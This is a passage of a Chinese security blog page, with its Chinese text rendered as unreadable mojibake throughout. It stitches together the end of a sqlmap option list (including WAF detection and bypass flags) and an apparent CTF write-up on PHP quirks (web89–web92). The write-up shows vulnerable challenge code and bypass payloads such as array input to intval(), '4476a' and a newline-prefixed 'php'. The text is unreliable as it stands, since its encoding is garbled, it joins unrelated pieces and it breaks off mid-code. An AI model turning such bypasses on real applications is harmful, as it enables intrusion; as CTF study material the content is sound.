â€“answers&#x3D;â€œextending&#x3D;Nâ€ â€“batch</p><h3 id="15-4-å‘ç°-SQL-æ³¨å…¥é¢„è­¦"><a href="#15-4-å‘ç°-SQL-æ³¨å…¥é¢„è­¦" class="headerlink" title="15.4 å‘ç° SQL æ³¨å…¥é¢„è­¦"></a>15.4 å‘ç° SQL æ³¨å…¥é¢„è­¦</h3><p>å¦‚æœç”¨æˆ·ä½¿ç”¨â€“beepï¼Œå½“å‘ç°SQLæ³¨å…¥æ—¶ï¼Œä¼šç«‹å³å‘å‡ºå“”å“”çš„è­¦å‘Šã€‚è¿™åœ¨éœ€è¦æµ‹è¯•çš„å¤§é‡ç›®æ ‡url(é€‰é¡¹-m)æ—¶ç‰¹åˆ«æœ‰ç”¨ã€‚</p><h3 id="15-5-å…¶ä»–"><a href="#15-5-å…¶ä»–" class="headerlink" title="15.5 å…¶ä»–"></a>15.5 å…¶ä»–</h3><p>â€“cleanup æ¸…é™¤DBMS udfåˆ›å»ºçš„æ•°æ®è¡¨ â€“dependencies æŸ¥çœ‹ä¾èµ–é¡¹ â€“disable-coloring ä¸è¿›è¡Œé«˜äº®æ˜¾ç¤º â€“identify-waf æŸ¥çœ‹æ˜¯å¦å…·æœ‰WAFä¿æŠ¤ â€“moblie ä½¿ç”¨æ‰‹æœºç«¯User-Agent â€“purge-output æ¸…é™¤outputç›®å½•ä¸‹çš„æ–‡ä»¶ â€“skip-waf ç»•è¿‡WAF â€“sqlmap-shell ä½¿ç”¨sqlmap shell â€“tmp-dir&#x3D;TMPDIR æŒ‡å®šæœ¬åœ°ç›®å½•ç”¨æ¥å­˜å‚¨ä¸´æ—¶æ–‡ä»¶ â€“web-root&#x3D;WEBROOT æŒ‡å®šç«™ç‚¹æ ¹ç›®å½• â€“wizard ä½¿ç”¨å‘å¯¼å¼çš„sqlmap â€“gpage&#x3D;GOOGLEPAGE è®¾ç½®Google Dorkçš„é¡µç æ•°</p><p>â€“smart æ™ºèƒ½æ¢æµ‹ æœ‰äº›æƒ…å†µä¸‹ï¼Œç”¨æˆ·æœ‰å¤§é‡çš„æ½œåœ¨ç›®æ ‡URLï¼ˆä¾‹å¦‚ï¼Œæä¾›äº†é€‰é¡¹ -mï¼‰ï¼Œå¸Œæœ›å°½å¿«æ‰¾åˆ°ä¸€ä¸ªè„†å¼±çš„ç›®æ ‡ã€‚å¦‚æœä½¿ç”¨â€”smartï¼Œé‚£ä¹ˆå°†åœ¨æ‰«æä¸­è¿›ä¸€æ­¥ä½¿ç”¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿé”™è¯¯çš„å‚æ•°ï¼Œå¦åˆ™å°±è·³è¿‡å®ƒä»¬</p><h2 id="0x10-å¸¸ç”¨-Tamper-è„šæœ¬"><a href="#0x10-å¸¸ç”¨-Tamper-è„šæœ¬" class="headerlink" title="0x10 å¸¸ç”¨ Tamper è„šæœ¬"></a>0x10 å¸¸ç”¨ Tamper è„šæœ¬</h2><p>è¿™é‡Œæ¨èå‡ ç¯‡æ¯”è¾ƒè¯¦ç»†çš„æ–‡ç« å»å­¦ä¹ ï¼š <a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.cnblogs.com/mark0/p/12349551.html&objectId=2148285&objectType=1&contentType=undefined">https://www.cnblogs.com/mark0/p/12349551.html</a></p><p><a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://blog.csdn.net/qq_34444097/article/details/82717357?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159341834119725219951313%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=159341834119725219951313&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_v3-5-82717357.first_rank_ecpm_v1_pc_rank_v3&utm_term=sqlmap%20tamper%E8%84%9A%E6%9C%AC&objectId=2148285&objectType=1&contentType=undefined">https://blog.csdn.net/qq_34444097&#x2F;article&#x2F;details&#x2F;82717357?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522159341834119725219951313%2522%252C%2522scm%2522%253A%252220140713.130102334â€¦%2522%257D&amp;request_id&#x3D;159341834119725219951313&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2allfirst_rank_ecpm_v1~pc_rank_v3-5-82717357.first_rank_ecpm_v1_pc_rank_v3&amp;utm_term&#x3D;sqlmap+tamperè„šæœ¬</a></p><blockquote><p> ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡å†…å®¹ç”±äº’è”ç½‘ç”¨æˆ·è‡ªå‘è´¡çŒ®ï¼Œè¯¥æ–‡è§‚ç‚¹ä»…ä»£è¡¨ä½œè€…æœ¬äººã€‚æœ¬ç«™ä»…æä¾›ä¿¡æ¯å­˜å‚¨ç©ºé—´æœåŠ¡ï¼Œä¸æ‹¥æœ‰æ‰€æœ‰æƒï¼Œä¸æ‰¿æ‹…ç›¸å…³æ³•å¾‹è´£ä»»ã€‚å¦‚å‘ç°æœ¬ç«™æœ‰æ¶‰å«Œä¾µæƒ&#x2F;è¿æ³•è¿è§„çš„å†…å®¹ï¼Œ è¯·å‘é€é‚®ä»¶è‡³ ä¸¾æŠ¥ï¼Œä¸€ç»æŸ¥å®ï¼Œæœ¬ç«™å°†ç«‹åˆ»åˆ é™¤ã€‚ </p><p>å‘å¸ƒè€…ï¼šå…¨æ ˆç¨‹åºå‘˜æ ˆé•¿ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼š<a href="https://javaforall.cn/200744.html%E5%8E%9F%E6%96%87%E9%93%BE%E6%8E%A5%EF%BC%9Ahttps://javaforall.cn">https://javaforall.cn/200744.htmlåŸæ–‡é“¾æ¥ï¼šhttps://javaforall.cn</a></p></blockquote><h1 id="4ã€PHPç‰¹æ€§"><a href="#4ã€PHPç‰¹æ€§" class="headerlink" title="4ã€PHPç‰¹æ€§"></a>4ã€PHPç‰¹æ€§</h1><h4 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>])) &#123;<span class="hljs-comment">//ä¼ å…¥num</span><br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<span class="hljs-comment">//å°†numçš„å€¼èµ‹ç»™$num</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>)) &#123;<span class="hljs-comment">//æ£€æŸ¥ $num æ˜¯å¦åŒ…å«æ•°å­—å­—ç¬¦</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<span class="hljs-comment">//è‹¥åŒ¹é…åˆ°æ•°å­—ï¼Œè„šæœ¬ç»ˆæ­¢å¹¶è¾“å‡º no no no!</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<span class="hljs-comment">//å°† $num è½¬æ¢ä¸ºæ•´æ•°ï¼Œè‹¥ç»“æœéé›¶åˆ™è¾“å‡º $flag</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¹æ®intval()çš„ç‰¹æ€§ï¼šintval($num)ä¸ºçœŸï¼Œè·å–flag</p><p>å¯ä»¥è¾“å…¥æ•°ç»„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?num[]=1<br></code></pre></td></tr></table></figure><p>è·å¾—äº†flag</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022030559.png"></p><p>è¡¥å……çŸ¥è¯†ï¼š</p><p><code>intval()</code>å‡½æ•°ç”¨äºå°†å˜é‡è½¬æ¢ä¸ºæ•´æ•°ã€‚å…¶è¡Œä¸ºæ ¹æ®è¾“å…¥ç±»å‹çš„ä¸åŒè€Œå˜åŒ–ï¼Œ</p><p><strong>1. åŸºæœ¬è¯­æ³•</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$value</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$base</span> = <span class="hljs-number">10</span>): <span class="hljs-keyword">int</span><br></code></pre></td></tr></table></figure><p><code>$value</code>ï¼šè¦è½¬æ¢çš„å˜é‡ï¼ˆæ”¯æŒæ‰€æœ‰æ•°æ®ç±»å‹ï¼‰</p><p><code>$base</code>ï¼šè½¬åŒ–æ‰€ä½¿ç”¨çš„è¿›åˆ¶ï¼ˆé»˜è®¤10ï¼Œä»…å¯¹å­—ç¬¦ä¸²æœ‰æ•ˆï¼‰</p><p><strong>2. ä¸åŒæ•°æ®ç±»å‹çš„è½¬æ¢è§„åˆ™</strong></p><p><strong>2.1 å­—ç¬¦ä¸²</strong></p><p>å°è¯•æå–å¼€å¤´çš„æ•°å­—éƒ¨åˆ†ï¼Œå¿½ç•¥åç»­éæ•°å­—å­—ç¬¦ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">intval(&quot;123&quot;);      // 123<br>intval(&quot;45.67&quot;);    // 45ï¼ˆæµ®ç‚¹æˆªæ–­ï¼‰<br>intval(&quot;123abc&quot;);   // 123ï¼ˆå¿½ç•¥å­—æ¯ï¼‰<br>intval(&quot;abc123&quot;);   // 0ï¼ˆå¼€å¤´æ— æ•°å­—ï¼‰<br></code></pre></td></tr></table></figure><p><strong>2.2 æµ®ç‚¹æ•°</strong></p><p>ç›´æ¥æˆªæ–­å°æ•°éƒ¨åˆ†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">intval(3.14);       // 3<br>intval(-2.718);     // -2<br></code></pre></td></tr></table></figure><p><strong>2.3 å¸ƒå°”</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">intval(true);       // 1<br>intval(false);      // 0<br></code></pre></td></tr></table></figure><p><strong>2.4 æ•°ç»„</strong></p><p>ç©ºæ•°ç»„ï¼ˆ<code>[]</code>ï¼‰ â€“&gt; 0</p><p>éç©ºæ•°ç»„ï¼ˆè‡³å°‘ä¸€ä¸ªå…ƒç´ ï¼‰ â€“&gt; 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">intval([]);         // 0<br>intval([&quot;a&quot;]);      // 1<br>intval([0, 1]);     // 1ï¼ˆä¸å…ƒç´ å†…å®¹æ— å…³ï¼‰<br></code></pre></td></tr></table></figure><p><strong>2.5 å¯¹è±¡</strong></p><p>ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1</p><p><strong>2.6 NULL</strong></p><p>å§‹ç»ˆè¿”å› 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">intval(null);       // 0<br></code></pre></td></tr></table></figure><h4 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>])) &#123;<span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦å­˜åœ¨numçš„GETå‚æ•°</span><br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<span class="hljs-comment">//å°†GETå‚æ•°numçš„å€¼èµ‹ç»™å˜é‡$num</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$num</span> === <span class="hljs-string">&quot;4476&quot;</span>) &#123;<span class="hljs-comment">//æ¯”è¾ƒ$numæ˜¯å¦ç­‰äºå­—ç¬¦ä¸²&quot;4476&quot;ï¼Œè‹¥æˆç«‹åˆ™ç»ˆæ­¢è„šæœ¬</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>, <span class="hljs-number">0</span>) === <span class="hljs-number">4476</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<span class="hljs-comment">//å°†$numè½¬æ¢ä¸ºæ•´æ•°ï¼ˆè‡ªåŠ¨æ£€æµ‹è¿›åˆ¶ï¼‰ï¼Œè‹¥ç»“æœä¸º4476ï¼Œåˆ™è¾“å‡º$flag</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>å½“numä¸º4476æ—¶è¾“å‡ºno no noï¼</p><p>å½“numçš„æ•´æ•°éƒ¨åˆ†ä¸º4476æ—¶å¾—åˆ°flag</p><p>$num ä¸º â€œ4476aâ€ï¼ˆä¸å…¨ç­‰äº â€œ4476â€ï¼‰ï¼Œç»•è¿‡ die()</p><p>intval(â€œ4476aâ€, 0) â†’ 4476ï¼Œè§¦å‘ echo $flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">payload:ï¼ˆéƒ½å¯ä»¥ç»•è¿‡ï¼‰<br>?num=4476a      # é™„åŠ å­—æ¯<br>?num=4476%20    # é™„åŠ ç©ºæ ¼ï¼ˆURLç¼–ç ï¼‰<br>?num=4476.0     # æµ®ç‚¹è¡¨ç¤º<br>?num=4476e0     # ç§‘å­¦è®¡æ•°æ³•<br>?num=0x117c     # åå…­è¿›åˆ¶<br>?num=010574 # å…«è¿›åˆ¶<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022030738.png"></p><h4 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/im&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/i&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hacker&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonononono&#x27;</span>;<br>&#125; nonononono<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªè¾“å…¥ä½¿å¾—å®ƒæ»¡è¶³ä¸¤ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¡ä»¶ï¼šç¬¬ä¸€ä¸ªæ­£åˆ™ï¼ˆå¸¦å¤šè¡Œæ¨¡å¼ï¼‰åŒ¹é…æˆåŠŸï¼Œè€Œç¬¬äºŒä¸ªæ­£åˆ™ï¼ˆä¸å¸¦å¤šè¡Œæ¨¡å¼ï¼‰åŒ¹é…å¤±è´¥ã€‚</p><p> <code>/i </code>è¡¨ç¤ºåŒ¹é…çš„æ—¶å€™ä¸åŒºåˆ†å¤§å°å†™</p><p> <code>/m </code>è¡¨ç¤ºå¤šè¡ŒåŒ¹é… </p><p><code>^$</code>ç¬¦å·è¡¨ç¤ºåŒ¹é…æ¯ä¸€è¡Œçš„å¼€å¤´ç»“å°¾</p><ol><li><strong>å¤šè¡Œæ¨¡å¼åŒ¹é…ï¼š</strong> ç¬¬ä¸€ä¸ªæ­£åˆ™<code>/^php$/im</code>ä¸­çš„<code>m</code>ä¿®é¥°ç¬¦å…è®¸<code>^</code>å’Œ<code>$</code>åŒ¹é…æ¯è¡Œçš„å¼€å¤´å’Œç»“å°¾ã€‚åªè¦æœ‰ä¸€è¡Œæ˜¯<code>php</code>ï¼Œåˆ™åŒ¹é…æˆåŠŸã€‚</li><li><strong>å•è¡Œæ¨¡å¼ä¸åŒ¹é…ï¼š</strong> ç¬¬äºŒä¸ªæ­£åˆ™<code>/^php$/i</code>è¦æ±‚æ•´ä¸ªå­—ç¬¦ä¸²å¿…é¡»å®Œå…¨åŒ¹é…<code>php</code>ï¼Œä¸”æ²¡æœ‰å¤šè¡Œæ¨¡å¼ï¼Œå› æ­¤å¿…é¡»æ•´ä¸ªå­—ç¬¦ä¸²éƒ½æ˜¯<code>php</code>ã€‚</li></ol><p><strong>æ„é€ Payloadï¼š</strong></p><p>åœ¨è¾“å…¥ä¸­æ·»åŠ æ¢è¡Œç¬¦<code>%0a</code>ï¼Œä½¿å¾—å…¶ä¸­ä¸€è¡Œæ˜¯<code>php</code>ï¼Œä½†æ•´ä¸ªå­—ç¬¦ä¸²ä¸ä»¥<code>php</code>ç»“å°¾ã€‚ä¾‹å¦‚ï¼š<code>php%0a</code>ã€‚è¿™æ ·ï¼Œç¬¬ä¸€è¡Œæ˜¯<code>php</code>ï¼Œæ»¡è¶³ç¬¬ä¸€ä¸ªæ­£åˆ™ï¼›æ•´ä¸ªå­—ç¬¦ä¸²æ˜¯<code>php\n</code>ï¼Œä¸ç¬¦åˆç¬¬äºŒä¸ªæ­£åˆ™çš„å®Œæ•´åŒ¹é…ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?cmd=php%0a<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022030117.png"></p><p>è¿™é‡Œå‘ç°è¿™ä¸ªpayloadå¹¶ä¸èƒ½ä½¿ç”¨</p><p>é”™è¯¯åŸå› ï¼šï¼ˆè¿™é‡Œè¯¢é—®äº†aiï¼‰</p><ul><li>è¾“å…¥å†…å®¹ä¸º <code>php\n</code>ï¼ˆ<code>php</code> åè·Ÿæ¢è¡Œç¬¦ï¼‰ã€‚</li><li><strong>ç¬¬ä¸€ä¸ªæ­£åˆ™åŒ¹é…æˆåŠŸ</strong>ï¼šç¬¬ä¸€è¡Œæ˜¯ <code>php</code>ï¼Œç¬¦åˆå¤šè¡Œæ¨¡å¼ã€‚</li><li><strong>ç¬¬äºŒä¸ªæ­£åˆ™ä¹ŸåŒ¹é…æˆåŠŸ</strong>ï¼šPHP çš„ <code>preg_match</code> åœ¨å•è¡Œæ¨¡å¼ä¸‹ï¼Œ<code>$</code> ä¼šå¿½ç•¥æœ«å°¾çš„æ¢è¡Œç¬¦ï¼å› æ­¤å®é™…åŒ¹é…çš„æ˜¯ <code>php</code>ï¼Œå¯¼è‡´è¾“å‡º <code>hacker</code>ã€‚</li><li>è¿™æ˜¯ PHP æ­£åˆ™è¡¨è¾¾å¼çš„ä¸€ä¸ªç‰¹æ€§ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>$</code> åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾æˆ–ç»“å°¾çš„æ¢è¡Œç¬¦å‰çš„ä½ç½®ï¼ˆå³ä½¿æ²¡æœ‰ <code>m</code> ä¿®é¥°ç¬¦ï¼‰ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?cmd=%0aphp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031488.png"></p><p>æ¢ä½ç½®åå‘ç°å¯ä»¥è¿”å›flag</p><ul><li>è¾“å…¥å†…å®¹ä¸º <code>\nphp</code>ï¼ˆæ¢è¡Œç¬¦åè·Ÿ <code>php</code>ï¼‰ã€‚</li><li><strong>ç¬¬ä¸€ä¸ªæ­£åˆ™åŒ¹é…æˆåŠŸ</strong>ï¼šç¬¬äºŒè¡Œæ˜¯ <code>php</code>ï¼Œç¬¦åˆå¤šè¡Œæ¨¡å¼ã€‚</li><li><strong>ç¬¬äºŒä¸ªæ­£åˆ™åŒ¹é…å¤±è´¥</strong>ï¼šæ•´ä¸ªå­—ç¬¦ä¸²æ˜¯ <code>\nphp</code>ï¼Œä¸ä»¥ <code>php</code> å¼€å¤´ï¼Œå› æ­¤æ— æ³•åŒ¹é…ã€‚</li></ul><hr><p>è¡¥å……çŸ¥è¯†ï¼š</p><p><strong>æ­£åˆ™è¿ç®—ç¬¦</strong></p><p>æ­£åˆ™è¿ç®—ç¬¦æ˜¯ç”¨äºå¤„ç†<strong>æ–‡æœ¬åŒ¹é…</strong>çš„å·¥å…·ï¼Œä¸»è¦ç”¨äºåœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾ã€æ›¿æ¢æˆ–æå–ç¬¦åˆç‰¹å®šè§„åˆ™çš„æ–‡æœ¬ã€‚ä½ å¯ä»¥æŠŠå®ƒç†è§£ä¸ºä¸€ä¸ªâ€œæ–‡æœ¬è¿‡æ»¤å™¨â€ï¼Œå¸®åŠ©ä½ å¿«é€Ÿæ‰¾åˆ°æƒ³è¦çš„æ–‡å­—å†…å®¹ã€‚</p><hr><p><strong>æ­£åˆ™è¿ç®—ç¬¦çš„åŸºæœ¬ç¬¦å·ï¼š</strong></p><ol><li><code>.</code>ï¼šåŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ï¼ˆé™¤äº†æ¢è¡Œç¬¦ï¼‰ã€‚ä¾‹å¦‚ï¼š<code>a.b</code> å¯ä»¥åŒ¹é… <code>aab</code>ã€<code>acb</code>ã€<code>a1b</code> ç­‰ã€‚</li><li><code>\*</code>ï¼šåŒ¹é…å‰é¢çš„å­—ç¬¦ 0 æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼š<code>ab*</code> å¯ä»¥åŒ¹é… <code>a</code>ã€<code>ab</code>ã€<code>abb</code>ã€<code>abbb</code> ç­‰ã€‚</li><li><code>+</code>ï¼šåŒ¹é…å‰é¢çš„å­—ç¬¦ 1 æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼š<code>ab+</code> å¯ä»¥åŒ¹é… <code>ab</code>ã€<code>abb</code>ã€<code>abbb</code>ï¼Œä½†ä¸èƒ½åŒ¹é… <code>a</code>ã€‚</li><li><code>?</code>ï¼šåŒ¹é…å‰é¢çš„å­—ç¬¦ 0 æ¬¡æˆ– 1 æ¬¡ã€‚ä¾‹å¦‚ï¼š<code>ab?</code> å¯ä»¥åŒ¹é… <code>a</code> æˆ– <code>ab</code>ã€‚</li><li><code>\d</code>ï¼šåŒ¹é…æ•°å­—ï¼ˆ0-9ï¼‰ã€‚ä¾‹å¦‚ï¼š<code>\d+</code> å¯ä»¥åŒ¹é… <code>123</code>ã€<code>4567</code> ç­‰ã€‚</li><li><code>\w</code>ï¼šåŒ¹é…å­—æ¯ã€æ•°å­—æˆ–ä¸‹åˆ’çº¿ã€‚ä¾‹å¦‚ï¼š<code>\w+</code> å¯ä»¥åŒ¹é… <code>abc</code>ã€<code>123</code>ã€<code>a_1</code> ç­‰ã€‚</li><li><code>[]</code>ï¼šåŒ¹é…æ‹¬å·å†…çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚ï¼š<code>[abc]</code> å¯ä»¥åŒ¹é… <code>a</code>ã€<code>b</code> æˆ– <code>c</code>ã€‚</li><li><code>^</code>ï¼šåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´ã€‚ä¾‹å¦‚ï¼š<code>^abc</code> å¯ä»¥åŒ¹é…ä»¥ <code>abc</code> å¼€å¤´çš„å­—ç¬¦ä¸²ã€‚</li><li><code>$</code>ï¼šåŒ¹é…å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚ä¾‹å¦‚ï¼š<code>abc$</code> å¯ä»¥åŒ¹é…ä»¥ <code>abc</code> ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚</li><li><code>^ &amp;</code>ï¼šåŒ¹é…å­—ç¬¦ä¸²ä¾‹å¦‚ï¼š<code>^abc&amp;</code>åŒ¹é…ä»¥abcå¼€å¤´å’Œä»¥abcç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œå®é™…ä¸Šæ˜¯åªæœ‰abcä¸ä¹‹åŒ¹é…</li><li><code>&quot;notice&quot;</code>: åŒ¹é…åŒ…å«noticeçš„å­—ç¬¦ä¸²ï¼›</li><li></li></ol><p>ç®€å•ç¤ºä¾‹ï¼š</p><p>å‡è®¾ä½ æœ‰ä¸€æ®µæ–‡å­—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">æˆ‘çš„ç”µè¯æ˜¯ 123-4567-8901ï¼Œé‚®ç®±æ˜¯ abc@example.comã€‚<br></code></pre></td></tr></table></figure><ul><li>ç”¨æ­£åˆ™è¡¨è¾¾å¼ <code>\d{3}-\d{4}-\d{4}</code> å¯ä»¥æå–å‡ºç”µè¯å·ç  <code>123-4567-8901</code>ã€‚</li><li>ç”¨æ­£åˆ™è¡¨è¾¾å¼ <code>\w+@\w+\.\w+</code> å¯ä»¥æå–å‡ºé‚®ç®± <code>abc@example.com</code>ã€‚</li></ul><p><strong>æ­£åˆ™è¿ç®—ç¬¦çš„ä¿®é¥°ç¬¦ï¼š</strong></p><ol><li><code>i</code> - ä¸åŒºåˆ†å¤§å°å†™åŒ¹é…æ—¶å¿½ç•¥å­—æ¯çš„å¤§å°å†™ã€‚</li><li><code>m</code> - å¤šè¡Œæ¨¡å¼ä½¿ <code>^</code> å’Œ <code>$</code> åŒ¹é…æ¯ä¸€è¡Œçš„å¼€å§‹å’Œç»“æŸï¼Œè€Œä¸æ˜¯æ•´ä¸ªå­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“æŸã€‚</li></ol><h4 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span 